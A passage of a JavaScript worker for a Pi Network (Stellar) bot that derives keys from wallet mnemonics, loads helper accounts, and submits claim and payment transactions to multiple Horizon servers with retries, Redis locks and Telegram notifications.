               ? await horizonRequest(horizonUrl, action, "Cek konfirmasi transaksi", botName)
               : await action();
     } catch (error) {
          return null;
     }
}

async function submitTransactionWithConfirmation(
     server,
     transaction,
     label,
     botName,
     retries,
     delayMs,
     horizonUrl = null,
     serializeSubmit = true
) {
     const transactionHash = getStellarTransactionHash(transaction);
     let sawAmbiguousSubmitError = false;

     for (let attempt = 0; attempt <= retries; attempt++) {
          try {
               const action = () => server.submitTransaction(transaction);
               let result;
               if (horizonUrl && serializeSubmit) {
                    result = await horizonRequest(horizonUrl, action, label, botName);
               } else {
                    if (horizonUrl) {
                         await waitForHorizonSlot(horizonUrl, botName, label);
                    }
                    result = await action();
               }
               return result.hash ? result : { ...result, hash: transactionHash };
          } catch (error) {
               if (horizonUrl && !serializeSubmit && isRateLimitError(error)) {
                    const cooldownMs = await markHorizonRateLimited(horizonUrl, getRetryAfterMs(error));
                    maybeLogHorizonThrottle(
                         botName,
                         horizonUrl,
                         `${label} kena 429. Horizon di-cooldown ${cooldownMs}ms sebelum request berikutnya.`,
                         "warning"
                    );
               }
               const existing = await findSubmittedTransaction(server, transactionHash, horizonUrl, botName);
               if (existing?.hash) {
                    workerLog(
                         `[${botName}] ${label} sudah tercatat di Horizon setelah timeout/retry. Hash: ${existing.hash}`,
                         "success"
                    );
                    return existing;
               }

               if (!isRetryableHorizonError(error)) {
                    const resultCodes = getHorizonResultCodes(error);
                    const txResult = resultCodes?.transaction;
                    if (sawAmbiguousSubmitError && txResult === "tx_bad_seq") {
                         workerLog(
                              `[${botName}] ${label} kemungkinan sudah terkirim, tetapi Horizon mengembalikan tx_bad_seq saat retry. Hash: ${transactionHash || "-"}`,
                              "warning"
                         );
                         return { hash: transactionHash, alreadySubmitted: true };
                    }
                    throw error;
               }

               const status = getHttpErrorStatus(error);
               if (status >= 500 && status <= 599) {
                    sawAmbiguousSubmitError = true;
               }
               if (attempt >= retries) {
                    throw error;
               }

               const waitMs = getRetryDelayMs(error, attempt, delayMs);
               workerLog(
                    `[${botName}] ${label} kena error sementara HTTP ${status || "unknown"}. Retry ${attempt + 1}/${retries} dalam ${waitMs}ms...`,
                    "warning"
               );
               if (waitMs > 0) {
                    await sleep(waitMs);
               }
          }
     }

     throw new Error(`${label} failed`);
}

function describeFetchError(error) {
     if (error && error.name === "AbortError") {
          return `timeout after ${WEB_SERVICE_TIMEOUT_MS}ms`;
     }
     return error?.message || "fetch failed";
}

async function fetchWithTimeout(url, options = {}, timeoutMs = WEB_SERVICE_TIMEOUT_MS) {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

     try {
          return await fetch(url, {
               ...options,
               signal: controller.signal,
          });
     } catch (error) {
          if (error.name === "AbortError") {
               throw new Error(`timeout after ${timeoutMs}ms`);
          }
          throw error;
     } finally {
          clearTimeout(timeoutId);
     }
}

async function fetchWithRetries(url, options = {}, retryOptions = {}) {
     const timeoutMs = retryOptions.timeoutMs ?? WEB_SERVICE_TIMEOUT_MS;
     const retries = retryOptions.retries ?? WEB_SERVICE_RETRY_COUNT;
     const retryDelayMs = retryOptions.retryDelayMs ?? WEB_SERVICE_RETRY_DELAY_MS;
     let lastError = null;

     for (let attempt = 0; attempt <= retries; attempt += 1) {
          try {
               return await fetchWithTimeout(url, options, timeoutMs);
          } catch (error) {
               lastError = error;
               if (attempt < retries && retryDelayMs > 0) {
                    await sleep(retryDelayMs * (attempt + 1));
               }
          }
     }

     throw lastError;
}

let lastLogSendFailureAt = 0;
let nextLogDeliveryRetryAt = 0;

function reportLogDeliveryFailure(message) {
     const now = Date.now();
     nextLogDeliveryRetryAt = now + LOG_SEND_FAILURE_REPORT_INTERVAL_MS;

     if (now - lastLogSendFailureAt >= LOG_SEND_FAILURE_REPORT_INTERVAL_MS) {
          lastLogSendFailureAt = now;
          console.warn(`[${WORKER_NAME}] ${message}`);
     }
}

async function sendLogToWebService(message, type = "info", details = null) {
     if (!WEB_SERVICE_URL || Date.now() < nextLogDeliveryRetryAt) {
          return;
     }

     try {
          const response = await fetchWithRetries(
               `${WEB_SERVICE_URL}/api/worker-logs`,
               {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ message, type, details, worker_name: WORKER_NAME }),
               },
               {
                    retries: 1,
               }
          );
          if (!response.ok) {
               reportLogDeliveryFailure(`Failed to send log to web service (Status: ${response.status})`);
          } else {
               lastLogSendFailureAt = 0;
               nextLogDeliveryRetryAt = 0;
          }
     } catch (error) {
          reportLogDeliveryFailure(`Failed to send log to web service: ${describeFetchError(error)}`);
     }
}

function workerLog(message, type = "info") {
     console.log(`[${WORKER_NAME}] ${message}`);
     sendLogToWebService(message, type);
}

async function acquireRedisLock(lockKey, ttlMs, waitMs, retryDelayMs, botName) {
     const token = crypto.randomUUID();
     const deadline = Date.now() + waitMs;

     while (Date.now() <= deadline) {
          const result = await redisClient.set(lockKey, token, {
               NX: true,
               PX: ttlMs,
          });

          if (result === "OK") {
               return token;
          }

          await sleep(retryDelayMs);
     }

     throw new Error(`Timeout waiting for lock ${lockKey}`);
}

async function releaseRedisLock(lockKey, token) {
     if (!token) return;
     await redisClient.eval(
          `
        if redis.call("GET", KEYS[1]) == ARGV[1] then
            return redis.call("DEL", KEYS[1])
        end
        return 0
        `,
          {
               keys: [lockKey],
               arguments: [token],
          }
     );
}

const loadingQueue = [];
let isLoadingInProgress = false;
let currentLoadingBot = null;

async function acquireLoadingLock(botName, unlockTime, horizonUrl) {
     return new Promise((resolve) => {
          const queueItem = {
               botName,
               unlockTime: new Date(unlockTime).getTime(),
               horizonUrl,
               resolve,
          };

          loadingQueue.push(queueItem);
          loadingQueue.sort((a, b) => a.unlockTime - b.unlockTime);

          processLoadingQueue();
     });
}

function releaseLoadingLock(botName) {
     if (currentLoadingBot === botName) {
          workerLog(`[${botName}] ⏳ Waiting 2s before releasing lock...`, "info");
          setTimeout(() => {
               console.log(`[${botName}] 🔓 Released loading lock`);
               currentLoadingBot = null;
               isLoadingInProgress = false;
               processLoadingQueue();
          }, 2000);
     }
}

function processLoadingQueue() {
     if (isLoadingInProgress || loadingQueue.length === 0) {
          return;
     }

     const nextItem = loadingQueue.shift();
     isLoadingInProgress = true;
     currentLoadingBot = nextItem.botName;

     const serverMatch = nextItem.horizonUrl.match(/(\d+\.\d+\.\d+\.\d+)/);
     const serverIP = serverMatch ? serverMatch[1] : "unknown";

     workerLog(
          `[${nextItem.botName}] 🔒 Acquired loading lock (Server: ${serverIP}, Queue: ${loadingQueue.length} waiting)`,
          "info"
     );
     nextItem.resolve();
}

async function loadRedisObject(key) {
     if (!redisClient.isOpen) {
          return {};
     }
     try {
          const data = await redisClient.get(key);
          const parsed = data ? JSON.parse(data) : {};
          return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : {};
     } catch (error) {
          console.error(`[${WORKER_NAME}] Error reading ${key} from Redis: ${error.message}`);
          return {};
     }
}

async function getTelegramSettings() {
     const settings = await loadRedisObject(SETTINGS_KEY);
     return {
          botToken: String(settings.telegram_bot_token || "").trim(),
          chatId: String(settings.telegram_chat_id || "").trim(),
     };
}

function normalizeRuntimeSubmitBeforeMs(value, fallback = SUBMIT_BEFORE_MS) {
     const parsed = Number.parseInt(value, 10);
     if (!Number.isFinite(parsed)) {
          return fallback;
     }
     return Math.min(Math.max(parsed, 0), 60000);
}

function normalizeRuntimeSubmitEndpointMode(value, fallback = SUBMIT_ENDPOINT_MODE) {
     const normalized = String(value ?? fallback).trim().toLowerCase();
     return normalized === "sync" ? "sync" : "async";
}

async function refreshRuntimeSettings() {
     const settings = await loadRedisObject(SETTINGS_KEY);
     const nextSubmitBeforeMs = normalizeRuntimeSubmitBeforeMs(settings.submit_before_ms, SUBMIT_BEFORE_MS);
     const nextSubmitEndpointMode = normalizeRuntimeSubmitEndpointMode(settings.submit_endpoint_mode, SUBMIT_ENDPOINT_MODE);
     if (nextSubmitBeforeMs !== SUBMIT_BEFORE_MS) {
          SUBMIT_BEFORE_MS = nextSubmitBeforeMs;
          workerLog(`⚙️ Runtime setting updated: SUBMIT_BEFORE_MS=${SUBMIT_BEFORE_MS}ms`, "success");
     }
     if (nextSubmitEndpointMode !== SUBMIT_ENDPOINT_MODE) {
          SUBMIT_ENDPOINT_MODE = nextSubmitEndpointMode;
          workerLog(`⚙️ Runtime setting updated: MODE=${SUBMIT_ENDPOINT_MODE}`, "success");
     }
     return { submit_before_ms: SUBMIT_BEFORE_MS, submit_endpoint_mode: SUBMIT_ENDPOINT_MODE };
}

async function sendTelegramMarkdown(text) {
     const telegram = await getTelegramSettings();
     if (!telegram.botToken || !telegram.chatId) {
          throw new Error("Telegram bot token/chat id belum diset");
     }

     const response = await fetch(`https://api.telegram.org/bot${telegram.botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: telegram.chatId, text: text, parse_mode: "Markdown" }),
     });

     if (!response.ok) {
          const detail = await response.text().catch(() => "");
          throw new Error(`Telegram HTTP ${response.status}${detail ? `: ${detail}` : ""}`);
     }
}

function getExplorerUrl(network, hash) {
     if (!hash) {
          return "-";
     }
     return network === "testnet"
          ? "https://blockexplorer.minepi.com/testnet/transactions/" + hash
          : "https://blockexplorer.minepi.com/mainnet/transactions/" + hash;
}

function formatFeeLossTelegramLines(feeLossInfo) {
     if (!feeLossInfo) {
          return "";
     }
     return `\n*Saldo Awal Funding:* ${feeLossInfo.before_pi} PI\n*Saldo Akhir Funding:* ${feeLossInfo.after_pi} PI\n*Coin Anda Terpotong:* ${feeLossInfo.loss_pi} PI`;
}

async function sendSuccessNotification(hash, pub, amount, network, feeLossInfo = null) {
     try {
          const text = `✅ **Transaction Successful!**\n\n*Amount:* ${amount} PI\n*Public Key:* ${pub}\n*Hash:* ${hash}\n*Explorer:* ${getExplorerUrl(network, hash)}${formatFeeLossTelegramLines(feeLossInfo)}`;
          await sendTelegramMarkdown(text);
     } catch (error) {
          console.error(`Telegram Error: ${error.message}`);
     }
}

async function sendFailureNotification(hash, pub, amount, network, feeLossInfo = null, workerSummary = "") {
     try {
          const text = `❌ **Transaction Failed!**\n\n*Amount:* ${amount} PI\n*Public Key:* ${pub}\n*Hash:* ${hash || "-"}\n*Explorer:* ${getExplorerUrl(network, hash)}${formatFeeLossTelegramLines(feeLossInfo)}${workerSummary ? `\n*Workers Failed:* ${workerSummary}` : ""}`;
          await sendTelegramMarkdown(text);
     } catch (error) {
          console.error(`Telegram Error: ${error.message}`);
     }
}

async function sendNewBotTelegram(botName, amount, memo) {
     const telegram = await getTelegramSettings();
     if (!telegram.botToken || !telegram.chatId) return;
     try {
          const text = `📥 **New Bot Detected: ${botName}**\n\n*Amount:* ${amount || "0"} PI\n*Memo:* ${memo || "-"}\n*Developer: @zendshost*`;

          await fetch(`https://api.telegram.org/bot${telegram.botToken}/sendMessage`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ chat_id: telegram.chatId, text: text, parse_mode: "Markdown" }),
          });
     } catch (error) {
          console.error(`Telegram Error: ${error.message}`);
     }
}

let botsCache = new Map();
const activeBots = new Map();
const startingBots = new Set();

const RUNTIME_BOT_STATUSES = new Set(["active", "preparing", "executing"]);
const BOT_CONFIG_FIELDS = [
     "bot_name",
     "claimer_mnemonic",
     "destination",
     "amount",
     "unlock_time",
     "outer_fee",
     "network",
     "helper_range",
     "transaction_type",
     "transaction_mode",
     "claimable_balance_id",
     "claimable_balance_ids",
     "fee_payer_id",
     "custom_memo",
     "recover_fees",
     "recover_fee_delay",
     "worker_name",
     "username",
     "user_timezone",
     "topup_helpers",
     "topup_target_balance",
     "sweep_helpers",
];

function isRuntimeBotStatus(status) {
     return RUNTIME_BOT_STATUSES.has(String(status || ""));
}

function pickBotConfigForCompare(bot) {
     const comparable = {};
     for (const field of BOT_CONFIG_FIELDS) {
          comparable[field] = bot?.[field] ?? null;
     }
     return comparable;
}

function hasBotConfigChanged(oldBot, newBot) {
     return JSON.stringify(pickBotConfigForCompare(oldBot)) !== JSON.stringify(pickBotConfigForCompare(newBot));
}

const NETWORKS = {
     testnet: {
          NETWORK_PASSPHRASE: "Pi Testnet",
          AVG_LEDGER_TIME: 5,
     },
     mainnet: {
          NETWORK_PASSPHRASE: "Pi Network",
          AVG_LEDGER_TIME: 5,
     },
};

function getSystemTime() {
     try {
          execSync('chronyc tracking 2>/dev/null || echo ""').toString();
     } catch (e) {}
     return new Date();
}

async function fetchFeePayerWalletRecord(feePayerId) {
     const workerWallets = await loadRedisData(WORKER_FEE_WALLETS_KEY);
     let wallet = workerWallets.find((w) => w.id === feePayerId);
     if (!wallet) {
          const wallets = await loadRedisData(FEE_WALLETS_KEY);
          wallet = wallets.find((w) => w.id === feePayerId);
     }
     return wallet || null;
}

async function fetchFeePayerWallet(feePayerId) {
     const wallet = await fetchFeePayerWalletRecord(feePayerId);
     return wallet ? wallet.mnemonic : null;
}

async function fetchUserEmail(username) {
     const workerUsers = await loadRedisData(WORKER_USERS_KEY);
     let user = workerUsers.find((u) => u.username === username);
     if (!user) {
          const users = await loadRedisData(USERS_KEY);
          user = users.find((u) => u.username === username);
     }
     return user ? user.email : null;
}

function createStellarServer(horizonUrl) {
     return new stellar.Horizon.Server(horizonUrl);
}

function withTimeout(promise, timeoutMs, message) {
     let timeoutId;
     const timeoutPromise = new Promise((_, reject) => {
          timeoutId = setTimeout(() => reject(new Error(message)), timeoutMs);
     });
     return Promise.race([promise, timeoutPromise]).finally(() => clearTimeout(timeoutId));
}

async function deriveKeypairFromMnemonic(mnemonic) {
     if (!mnemonic || typeof mnemonic !== "string") {
          throw new Error("Mnemonic is required");
     }
     const normalizedMnemonic = mnemonic.toLowerCase().trim();
     if (!bip39.validateMnemonic(normalizedMnemonic)) {
          throw new Error("Invalid mnemonic");
     }

     const seed = await bip39.mnemonicToSeed(normalizedMnemonic);
     const derived = edHd.derivePath("m/44'/314159'/0'", seed);
     const keypair = stellar.Keypair.fromRawEd25519Seed(derived.key);
     return keypair;
}

async function pingHorizonServer(horizonUrl, timeout = 5000) {
     try {
          const server = createStellarServer(horizonUrl);
          const start = Date.now();
          await withTimeout(server.ledgers().limit(1).call(), timeout, `Horizon ping timed out after ${timeout}ms`);
          const latency = Date.now() - start;
          return { url: horizonUrl, online: true, latency };
     } catch (error) {
          return { url: horizonUrl, online: false, error: error.message };
     }
}

async function findFastHorizons(horizonUrls, botName, timeout = HORIZON_PING_TIMEOUT_MS) {
     const uniqueUrls = [...new Set(horizonUrls.filter(Boolean))];
     if (uniqueUrls.length === 0) {
          return [];
     }

     workerLog(`[${botName}] Testing ${uniqueUrls.length} Horizon endpoint(s)...`, "info");
     const results = await Promise.all(uniqueUrls.map((url) => pingHorizonServer(url, timeout)));
     const online = results.filter((result) => result.online).sort((a, b) => a.latency - b.latency);

     for (const result of results) {
          if (result.online) {
               workerLog(`[${botName}] Horizon online ${result.url} (${result.latency}ms)`, "success");
          } else {
               workerLog(`[${botName}] Horizon offline ${result.url}: ${result.error}`, "warning");
          }
     }

     return online.map((result) => result.url);
}

async function loadAllHelpersAsync(horizonUrls, mnemonicList, botName, helperStartIndex = 0) {
     const availableHorizons = normalizeHorizonUrls(horizonUrls);
     if (availableHorizons.length === 0) {
          workerLog(`[${botName}] Tidak ada Horizon online untuk load helper.`, "warning");
          return [];
     }

     workerLog(`[${botName}] ⏳ Loading ${mnemonicList.length} helpers...`, "info");

     const maxRetries = Math.max(1, HELPER_LOAD_RETRY_COUNT);
     const retryDelayBaseMs = Math.max(0, HELPER_LOAD_RETRY_DELAY_MS);
     const loadPromises = mnemonicList.map(async (mnemonic, index) => {
          const helperNumber = helperStartIndex + index + 1;
          try {
               const keypair = await deriveKeypairFromMnemonic(mnemonic);
               const pub = keypair.publicKey();

               let account;
               let attempt = 0;
               while (attempt < maxRetries) {
                    try {
                         const horizonUrl = availableHorizons[Math.floor(Math.random() * availableHorizons.length)];
                         const server = createStellarServer(horizonUrl);
                         account = await server.loadAccount(pub);
                         break;
                    } catch (error) {
                         const status = getHttpErrorStatus(error);
                         attempt++;
                         if (status === 404) {
                              throw new Error(`Account ${pub.substring(0, 8)}... does not exist`);
                         }
                         if (attempt >= maxRetries) {
                              throw new Error(
                                   `Failed to load ${pub.substring(0, 8)}... after ${attempt} attempts: ${error.message}`
                              );
                         }
                         const waitMs = retryDelayBaseMs * attempt;
                         await sleep(waitMs);
                    }
               }

               const helperShort = pub.substring(pub.length - 4);
               workerLog(`[${botName}] ✅ Helper ${helperNumber} loaded (...${helperShort})`, "success");
               return {
                    success: true,
                    helper: { pub, keypair, sequence: BigInt(account.sequence), account, helperNumber },
                    index,
               };
          } catch (error) {
               workerLog(`[${botName}] ❌ Helper ${helperNumber} failed: ${error.message}`, "error");
               return { success: false, error: error.message, index };
          }
     });

     const results = await Promise.all(loadPromises);
     const successfulHelpers = results.filter((r) => r.success).map((r) => r.helper);
     const failedCount = results.filter((r) => !r.success).length;

     if (failedCount > 0) {
          workerLog(
               `[${botName}] ⚠️ ${failedCount} helpers failed to load, continuing with ${successfulHelpers.length} successful helpers`,
               "warning"
          );
     } else {
          workerLog(`[${botName}] ✅ All ${successfulHelpers.length}/${mnemonicList.length} helpers ready`, "info");
     }

     return successfulHelpers;
}

function parseHelperRange(rangeStr, maxHelpers) {
     rangeStr = rangeStr.trim();
     if (rangeStr.includes("-")) {
          const [start, end] = rangeStr.split("-").map((s) => parseInt(s.trim()));
          if (isNaN(start) || isNaN(end) || start < 1 || end > maxHelpers || start > end) {
               throw new Error(`Invalid helper range: ${rangeStr}`);
          }
          return { start: start - 1, end: end - 1 };
     } else {
          const single = parseInt(rangeStr);
          if (isNaN(single) || single < 1 || single > maxHelpers) {
               throw new Error(`Invalid helper number: ${rangeStr}`);
          }
          return { start: single - 1, end: single - 1 };
     }
}

function buildOperations(claimerPub, destination, amount, txType, claimableIds) {
     const operations = [];
     const needsPayment = txType === "send_only" || txType === "claim_and_send";
     const paymentAmount = parseFloat(amount);
     const selectedClaimableIds = normalizeClaimableBalanceIds(claimableIds);

     if (needsPayment && (!Number.isFinite(paymentAmount) || paymentAmount <= 0)) {
          throw new Error(`Invalid payment amount: ${amount}`);
     }

     const maxClaimableOperations = txType === "claim_and_send" ? 99 : 100;
     if (selectedClaimableIds.length > maxClaimableOperations) {
          throw new Error(`Too many claimable balances selected. Maximum ${maxClaimableOperations} per transaction.`);
     }

     const addClaimableOperations = () => {
          selectedClaimableIds.forEach((balanceId) => {
               operations.push(
                    stellar.Operation.claimClaimableBalance({
                         balanceId,
                         source: claimerPub,
                    })
               );
          });
     };

     if (txType === "claim_only") {
          addClaimableOperations();
     } else if (txType === "send_only") {
          operations.push(
               stellar.Operation.payment({
                    destination,
                    asset: stellar.Asset.native(),
                    amount: paymentAmount.toFixed(7),
                    source: claimerPub,
               })
          );
     } else if (txType === "claim_and_send") {
          addClaimableOperations();
          operations.push(
               stellar.Operation.payment({
                    destination,
                    asset: stellar.Asset.native(),
                    amount: paymentAmount.toFixed(7),
                    source: claimerPub,
               })
          );
     }
     if (operations.length === 0) {
          throw new Error(`No operations built for transaction type: ${txType}`);
     }
     return operations;
}

async function submitSignedXdrToHorizon(horizonUrl, signedXdr) {
     const baseUrl = String(horizonUrl || "").replace(/\/+$/, "");
     const useAsync = SUBMIT_ENDPOINT_MODE === "async";
     const endpoint = `${baseUrl}/${useAsync ? "transactions_async" : "transactions"}`;
     const body = new URLSearchParams({ tx: signedXdr }).toString();

     const response = await SUBMIT_HTTP_CLIENT.post(endpoint, body, {
          headers: {
               "Content-Type": "application/x-www-form-urlencoded",
               "Connection": "keep-alive",
          },
     });

     const data = response.data && typeof response.data === "object" ? response.data : {};
     const txStatus = String(data?.tx_status || "").trim().toUpperCase();

     if (!useAsync) {
          // Mode Python-compatible: stellar_sdk.Server.submit_transaction() memakai /transactions.
          // Response 2xx berarti Horizon telah memproses submit sinkron dan memberi hasil transaksi.
          if (response.status >= 200 && response.status < 300) {
               return { ...data, tx_status: "SUCCESS", finalized: true, async_accepted: false };
          }

          const error = new Error(
               data?.detail ||
               data?.title ||
               data?.error ||
               `Horizon sync submit failed with status code ${response.status}`
          );
          error.status = response.status;
          error.response = {
               status: response.status,
               headers: response.headers || {},
               data,
          };
          throw error;
     }

     // /transactions_async hanya mengonfirmasi bahwa Stellar Core menerima submission.
     // PENDING / DUPLICATE bukan bukti transaksi sudah sukses di ledger.
     if (response.status === 409 && txStatus === "DUPLICATE") {
          return { ...data, tx_status: txStatus, async_accepted: true, duplicate: true, finalized: false };
     }

     if (response.status < 200 || response.status >= 300) {
          const error = new Error(
               data?.detail ||
               data?.title ||
               data?.error ||
               `Horizon async submit failed with status code ${response.status}${txStatus ? ` (${txStatus})` : ""}`
          );
          error.status = response.status;
          error.response = {
               status: response.status,
               headers: response.headers || {},
               data,
          };
          throw error;
     }

     if (txStatus && !["PENDING", "DUPLICATE"].includes(txStatus)) {
          const error = new Error(`Horizon async submit returned ${txStatus}`);
          error.status = response.status;
          error.response = {
               status: response.status,
               headers: response.headers || {},
               data,
          };
          throw error;
     }

     return { ...data, tx_status: txStatus || "PENDING", async_accepted: true, finalized: false };
}

async function submitToHorizons(
     horizonUrls,
     transactionOrXdr,
     botName = WORKER_NAME,
     serverCache = null,
     maxSubmitHorizons = MAX_SUBMIT_HORIZONS
) {
     const submitTargets = Number.isFinite(maxSubmitHorizons) ? horizonUrls.slice(0, maxSubmitHorizons) : horizonUrls;
     const promises = submitTargets.map(async (horizonUrl) => {
          try {
               const start = Date.now();
               const isSignedXdr = typeof transactionOrXdr === "string";
               const result = isSignedXdr
                    ? await submitSignedXdrToHorizon(horizonUrl, transactionOrXdr)
                    : await (serverCache?.get(horizonUrl) || createStellarServer(horizonUrl)).submitTransaction(transactionOrXdr);
               const finalized = isSignedXdr ? result?.finalized === true : true;
               return {
                    success: true,
                    accepted: true,
                    finalized,
                    txStatus: isSignedXdr ? String(result?.tx_status || (finalized ? "SUCCESS" : "PENDING")).toUpperCase() : "SUCCESS",
                    hash: result.hash,
                    horizonUrl,
                    latency: Date.now() - start,
               };
          } catch (err) {
               if (isRateLimitError(err)) {
                    const cooldownMs = await markHorizonRateLimited(horizonUrl, getRetryAfterMs(err));
                    maybeLogHorizonThrottle(
                         botName,
                         horizonUrl,
                         `Submit utama kena 429. Horizon di-cooldown ${cooldownMs}ms untuk request berikutnya.`,
                         "warning"
                    );
               }
               const resultCodes = err.response?.data?.extras?.result_codes;
               const error = resultCodes ? `${err.message} ${JSON.stringify(resultCodes)}` : err.message;
               return { success: false, error, horizonUrl };
          }
     });
     return await Promise.all(promises);
}

async function updateBotStatusLegacy(botName, status, message) {
     try {
          let bots = [];
          let readSuccess = false;
          let attempts = 0;

          while (attempts < 5 && !readSuccess) {
               try {
                    bots = await loadRedisData(WORKER_BOTS_KEY);
                    readSuccess = true;
               } catch (e) {
                    attempts++;
                    await new Promise((resolve) => setTimeout(resolve, 100 * attempts));
               }
          }

          if (!readSuccess) {
               console.error(`[${WORKER_NAME}] ❌ Gagal update status ${botName}: Redis tidak dapat diakses.`);
               return;
          }

          const botIndex = bots.findIndex((bot) => bot.bot_name === botName);
          if (botIndex !== -1) {
               const bot = bots[botIndex];
               bot.status = status;
               if (message) bot.last_message = message;

               await saveRedisData(WORKER_BOTS_KEY, bots);

               const activeBot = activeBots.get(botName);

               if (activeBot) {
                    activeBot.currentStatus = status;
                    activeBots.set(botName, activeBot);
               }

               if (botsCache.has(botName)) {
                    const cached = botsCache.get(botName);

                    cached.status = status;
                    cached.last_message = message;

                    botsCache.set(botName, cached);
               }

               if (botsCache.has(botName)) {
                    const cachedData = botsCache.get(botName);
                    botsCache.set(botName, {
                         ...cachedData,
                         status: status,
                         last_message: message || bot.last_message,
                    });
               }

               await sendLogToWebService(`[Status Change] Bot ${botName} set to: ${status}`, "info");
          }
     } catch (error) {
          console.error(`[${WORKER_NAME}] ❌ Error updating bot status in Redis: ${error.message}`);
     }
}

async function updateBotStatus(botName, status, message) {
     try {
          if (!redisClient.isOpen) {
               console.error(`[${WORKER_NAME}] Redis is not connected. Failed to update status for ${botName}.`);
               return;
          }

          const statusMessage = message ? String(message) : "";
          const statusValue = String(status || "waiting");
          const statusUpdatedAt = new Date().toISOString();
          const updateResult = await redisClient.eval(UPDATE_BOT_STATUS_SCRIPT, {
               keys: [WORKER_BOTS_KEY],
               arguments: [String(botName), statusValue, statusMessage, statusUpdatedAt],
          });

          if (updateResult === -1) {
               console.error(`[${WORKER_NAME}] Failed to update status for ${botName}: invalid bot data in Redis.`);
               return;
          }

          if (updateResult === 0) {
               console.warn(
                    `[${WORKER_NAME}] Failed to update status for ${botName}: bot not found in ${WORKER_BOTS_KEY}.`
               );
               return;
          }

          const activeBot = activeBots.get(botName);
          if (activeBot) {
               activeBot.currentStatus = statusValue;
               activeBots.set(botName, activeBot);
          }

          if (botsCache.has(botName)) {
               const cachedData = botsCache.get(botName);
               botsCache.set(botName, {
                    ...cachedData,
                    status: statusValue,
                    last_message: statusMessage || cachedData.last_message,
                    status_updated_at: statusUpdatedAt,
               });
          }

          await sendLogToWebService(`[Status Change] Bot ${botName} set to: ${statusValue}`, "info", {
               event: "bot-status",
               bot_name: botName,
               status: statusValue,
               message: statusMessage,
               status_updated_at: statusUpdatedAt,
          });
     } catch (error) {
          console.error(`[${WORKER_NAME}] Error updating bot status in Redis: ${error.message}`);
     }
}

async function saveBotRuntimeFields(botName, fields) {
     try {
          const bots = await loadRedisData(WORKER_BOTS_KEY);
          const index = bots.findIndex((bot) => bot.bot_name === botName);
          if (index < 0) {
               return false;
          }
          bots[index] = {
               ...bots[index],
               ...fields,
          };
          await saveRedisData(WORKER_BOTS_KEY, bots);
          if (botsCache.has(botName)) {
               botsCache.set(botName, {
                    ...botsCache.get(botName),
                    ...fields,
               });
          }
          return true;
     } catch (error) {
          workerLog(`[${botName}] Gagal simpan runtime fields: ${error.message}`, "warning");
          return false;
     }
}

function sequenceReservationKey(accountPublicKey) {
     return `${SEQUENCE_RESERVATION_KEY_PREFIX}${String(accountPublicKey || "").trim()}`;
}

function shortAccountForLog(accountPublicKey) {
     const text = String(accountPublicKey || "");
     return text.length > 12 ? `${text.slice(0, 6)}...${text.slice(-6)}` : text;
}

async function reserveHelperSequence(helper, botName, submitAtMs) {
     const baseSequence = (helper.sequence ?? 0n).toString();
     if (!SEQUENCE_MANAGER_ENABLED || !redisClient.isOpen) {
          return baseSequence;
     }

     const key = sequenceReservationKey(helper.pub);
     const existingRaw = await redisClient.get(key);
     if (existingRaw) {
          try {
               const existing = JSON.parse(existingRaw);
               if (existing?.bot_name && existing.bot_name !== botName) {
                    throw new Error(
                         `Sequence/helper ${shortAccountForLog(helper.pub)} sudah dipakai oleh ${existing.bot_name}. Hapus/stop bot itu dulu atau pakai helper lain.`
                    );
               }
          } catch (error) {
               if (String(error.message || "").includes("sudah dipakai")) {
                    throw error;
               }
          }
     }

     const ttlMs = Math.max(
          SEQUENCE_RESERVATION_TTL_MS,
          Math.min(86400000, Math.max(60000, Number(submitAtMs || Date.now()) - Date.now() + 300000))
     );
     const payload = {
          bot_name: botName,
          worker_name: WORKER_NAME,
          helper_pub: helper.pub,
          helper_number: helper.helperNumber || null,
          builder_sequence: baseSequence,
          submit_at: Number.isFinite(Number(submitAtMs)) ? new Date(Number(submitAtMs)).toISOString() : null,
          reserved_at: new Date().toISOString(),
     };
     await redisClient.set(key, JSON.stringify(payload), { PX: ttlMs });
     return baseSequence;
}

async function releaseBotSequenceReservations(botName) {
     if (!SEQUENCE_MANAGER_ENABLED || !redisClient.isOpen || !botName) {
          return 0;
     }
     let released = 0;
     try {
          for await (const key of redisClient.scanIterator({ MATCH: `${SEQUENCE_RESERVATION_KEY_PREFIX}*`, COUNT: 100 })) {
               const raw = await redisClient.get(key);
               if (!raw) continue;
               try {
                    const item = JSON.parse(raw);
                    if (item?.bot_name === botName) {
                         await redisClient.del(key);
                         released += 1;
                    }
               } catch (error) {}
          }
          if (released > 0) {
               workerLog(`[${botName}] 🧹 Sequence Manager: released ${released} helper reservation(s).`, "info");
          }
     } catch (error) {
          workerLog(`[${botName}] ⚠️ Sequence Manager release error: ${error.message}`, "warning");
     }
     return released;
}

async function loadAllKnownBotsForNotification() {
     const keys = new Set([WORKER_BOTS_KEY, BOTS_KEY]);
     const workers = await loadRedisData(WORKERS_KEY);
     for (const worker of workers) {
          const workerName = String(worker?.name || "").trim();
          if (workerName) {
               keys.add(getWorkerBotsKey(workerName));
          }
     }

     const bots = [];
     const seen = new Set();
     for (const key of keys) {
          for (const bot of await loadRedisData(key)) {
               const identity = String(bot?.bot_name || "").trim();
               if (!identity || seen.has(identity)) {
                    continue;
               }
               seen.add(identity);
               bots.push(normalizeBotForStorage(bot));
          }
     }
     return bots;
}

function isSameBotGroup(bot, groupName, distributedGroupId) {
     if (distributedGroupId && bot?.distributed_group_id === distributedGroupId) {
          return true;
     }
     return bot?.bot_name === groupName || bot?.parent_bot_name === groupName;
}

async function sendFailureNotificationIfAllWorkersFailed({
     botName,
     parentBotName,
     distributedGroupId,
     hash,
     pub,
     amount,
     network,
     feeLossInfo,
}) {
     const groupName = parentBotName || botName;
     const groupKey = distributedGroupId || groupName;
     const bots = await loadAllKnownBotsForNotification();
     const groupBots = bots.filter((bot) => isSameBotGroup(bot, groupName, distributedGroupId));
     if (!groupBots.length) {
          return;
     }

     const successStatuses = new Set(["claimed", "sent"]);
     const failureStatuses = new Set(["lost", "error"]);
     const hasSuccess = groupBots.some((bot) => successStatuses.has(String(bot.status || "")));
     const allFinishedFailed = groupBots.every((bot) => failureStatuses.has(String(bot.status || "")));

